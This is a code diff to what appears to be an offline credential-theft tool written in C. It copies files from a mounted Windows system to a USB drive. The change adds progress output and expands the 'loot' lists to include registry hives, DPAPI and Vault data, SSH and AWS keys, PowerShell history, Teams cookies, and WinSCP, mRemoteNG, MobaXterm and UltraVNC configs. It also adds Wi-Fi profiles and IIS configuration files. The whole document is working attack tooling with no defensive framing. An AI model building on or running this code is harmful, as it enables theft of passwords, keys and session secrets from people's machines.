@@ -1507,7 +1507,95 @@ struct loot_stats {
 	int copied;
 	int skipped;
 	int failed;
+	unsigned long long bytes;
+	unsigned long long last_status_bytes;
+	time_t last_status_time;
+	const char *phase;
+	int status_active;
 };
+
+static void loot_print_progress(struct loot_stats *stats, int force)
+{
+	time_t now = time(NULL);
+	unsigned long long mib = stats->bytes / (1024ULL * 1024ULL);
+
+	if (!force &&
+	    now - stats->last_status_time < 2 &&
+	    stats->bytes - stats->last_status_bytes < 16ULL * 1024ULL * 1024ULL)
+		return;
+
+	printf("\r%s[*] %sloot: %s... %d file(s), %llu MiB copied%s",
+	       COLOR_BLUE, COLOR_RESET,
+	       stats->phase ? stats->phase : "copying",
+	       stats->copied, mib, force ? "\n" : "");
+	fflush(stdout);
+
+	stats->last_status_time = now;
+	stats->last_status_bytes = stats->bytes;
+	stats->status_active = !force;
+}
+
+static int loot_copy_file(const char *src, const char *dst, struct loot_stats *stats)
+{
+	char buf[16384];
+	int in_fd;
+	int out_fd;
+	ssize_t got;
+	int rc = 0;
+
+	in_fd = open(src, O_RDONLY | O_CLOEXEC);
+	if (in_fd < 0) {
+		print_fail("copy failed: cannot open %s: %s", src, strerror(errno));
+		return -1;
+	}
+
+	if (ensure_file_parent_dirs(dst) != 0) {
+		print_fail("copy failed: cannot create parent directory for %s: %s",
+			   dst, strerror(errno));
+		close(in_fd);
+		return -1;
+	}
+
+	unlink(dst);
+	out_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+	if (out_fd < 0) {
+		print_fail("copy failed: cannot create %s: %s", dst, strerror(errno));
+		close(in_fd);
+		return -1;
+	}
+
+	while ((got = read(in_fd, buf, sizeof(buf))) > 0) {
+		ssize_t written = 0;
+
+		while (written < got) {
+			ssize_t put = write(out_fd, buf + written, (size_t)(got - written));
+
+			if (put < 0) {
+				print_fail("copy failed: cannot write %s: %s", dst, strerror(errno));
+				rc = -1;
+				goto out;
+			}
+			if (put == 0) {
+				print_fail("copy failed: short write to %s", dst);
+				rc = -1;
+				goto out;
+			}
+			written += put;
+			stats->bytes += (unsigned long long)put;
+			loot_print_progress(stats, 0);
+		}
+	}
+
+	if (got < 0) {
+		print_fail("copy failed: cannot read %s: %s", src, strerror(errno));
+		rc = -1;
+	}
+
+out:
+	close(out_fd);
+	close(in_fd);
+	return rc;
+}
 
 static int copy_tree_recursive(const char *src, const char *dst, struct loot_stats *stats)
 {
@@ -1552,8 +1640,9 @@ static int copy_tree_recursive(const char *src, const char *dst, struct loot_sta
 	}
 
 	if (S_ISREG(st.st_mode)) {
-		if (copy_file(src, dst) == 0) {
+		if (loot_copy_file(src, dst, stats) == 0) {
 			stats->copied++;
+			loot_print_progress(stats, 0);
 			return 0;
 		}
 		stats->failed++;
@@ -1575,6 +1664,10 @@ static int loot_copy_relative(const char *windows_root, const char *relative,
 		return 0;
 
 	snprintf(dst, sizeof(dst), "%s/windows/%s", stage, relative);
+	if (stats->status_active) {
+		puts("");
+		stats->status_active = 0;
+	}
 	print_info("loot: collect %s", relative);
 	return copy_tree_recursive(src, dst, stats);
 }
@@ -1584,15 +1677,30 @@ static void loot_collect_user_profile(const char *windows_root, const char *user
 {
 	const char *items[] = {
 		"NTUSER.DAT",
+		".aws",
+		".ssh",
 		"AppData/Local/Microsoft/Credentials",
 		"AppData/Local/Microsoft/Protect",
 		"AppData/Local/Microsoft/Vault",
+		"AppData/Local/Microsoft/Windows/UsrClass.dat",
+		"AppData/Local/Microsoft/Windows/PowerShell/PSReadLine",
+		"AppData/Local/Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState",
+		"AppData/Local/mRemoteNG",
+		"AppData/Local/Mobatek/MobaXterm",
 		"AppData/Roaming/Microsoft/Credentials",
 		"AppData/Roaming/Microsoft/Crypto",
 		"AppData/Roaming/Microsoft/Protect",
+		"AppData/Roaming/Microsoft/Teams/Cookies",
+		"AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine",
+		"AppData/Roaming/Microsoft/Windows/Recent",
 		"AppData/Roaming/Microsoft/SystemCertificates",
 		"AppData/Roaming/Microsoft/Vault",
-		"AppData/Local/Microsoft/Windows/UsrClass.dat",
+		"AppData/Roaming/MobaXterm",
+		"AppData/Roaming/mRemoteNG",
+		"AppData/Roaming/Notepad++/backup",
+		"AppData/Roaming/WinSCP.ini",
+		"Documents/MobaXterm",
+		"Documents/WinSCP.ini",
 		NULL,
 	};
 	size_t i;
@@ -1655,7 +1763,8 @@ static int write_loot_manifest(const char *stage, const char *windows_root)
 	fprintf(fp, "- Registry hives: SAM, SYSTEM, SECURITY, SOFTWARE, DEFAULT, transaction logs, RegBack\n");
 	fprintf(fp, "- LSA secrets at rest: SECURITY hive with SYSTEM bootkey material\n");
 	fprintf(fp, "- DPAPI material: user and machine Protect/Credentials/Vault/Crypto paths\n");
-	fprintf(fp, "- Domain controller database if present: Windows/NTDS/NTDS.dit\n");
+	fprintf(fp, "- User artifacts: PowerShell history, Notepad state, Notepad++ backups, Recent links\n");
+	fprintf(fp, "- App secrets: WinSCP, mRemoteNG, MobaXterm, Teams cookies, AWS and SSH profile files\n");
 	fclose(fp);
 	return 0;
 }
@@ -1691,11 +1800,21 @@ static int collect_offline_loot(const char *windows_root, const char *stage)
 		"ProgramData/Microsoft/Crypto",
 		"ProgramData/Microsoft/Protect",
 		"ProgramData/Microsoft/Vault",
-		"Windows/NTDS/NTDS.dit",
+		"ProgramData/Microsoft/Wlansvc/Profiles/Interfaces",
+		"ProgramData/AWSCLI",
+		"Windows/System32/inetsrv/config/applicationHost.config",
+		"Windows/System32/inetsrv/config/administration.config",
+		"Windows/System32/inetsrv/config/redirection.config",
+		"Program Files/UltraVNC/ultravnc.ini",
+		"Program Files (x86)/UltraVNC/ultravnc.ini",
+		"Program Files/uvnc bvba/UltraVNC/ultravnc.ini",
+		"Program Files (x86)/uvnc bvba/UltraVNC/ultravnc.ini",
 		NULL,
 	};
-	struct loot_stats stats = { 0, 0, 0 };
+	struct loot_stats stats = { 0 };
 	size_t i;
+
+	stats.phase = "staging";
 
 	if (ensure_parent_dirs(stage) != 0) {
 		print_fail("loot failed: cannot create stage %s: %s", stage, strerror(errno));
@@ -1706,9 +1825,10 @@ static int collect_offline_loot(const char *windows_root, const char *stage)
 	for (i = 0; system_items[i]; i++)
 		loot_copy_relative(windows_root, system_items[i], stage, &stats);
 	loot_collect_user_profiles(windows_root, stage, &stats);
+	loot_print_progress(&stats, 1);
 
-	print_info("loot: staged %d file(s), skipped %d special item(s), %d failure(s)",
-		   stats.copied, stats.skipped, stats.failed);
+	print_info("loot: staged %d file(s), %llu MiB, skipped %d special item(s), %d failure(s)",
+		   stats.copied, stats.bytes / (1024ULL * 1024ULL), stats.skipped, stats.failed);
 	if (stats.copied == 0 || stats.failed > 0)
 		return 1;
 
@@ -1725,9 +1845,11 @@ static void make_loot_id(char *out, size_t out_len)
 static int store_loot_on_usb(const char *stage, const char *loot_id)
 {
 	char dest[512];
-	struct loot_stats stats = { 0, 0, 0 };
+	struct loot_stats stats = { 0 };
 	int rc;
 	int unmount_failed = 0;
+
+	stats.phase = "writing USB";
 
 	if (run_loot_mount() != 0)
 		return 1;
@@ -1735,6 +1857,7 @@ static int store_loot_on_usb(const char *stage, const char *loot_id)
 	snprintf(dest, sizeof(dest), "%s/%s", LOOT_MOUNTPOINT, loot_id);
 	print_info("loot: writing staged collection to %s", dest);
 	rc = copy_tree_recursive(stage, dest, &stats);
+	loot_print_progress(&stats, 1);
 
 	chdir("/");
 	if (umount2(LOOT_MOUNTPOINT, 0) == 0)
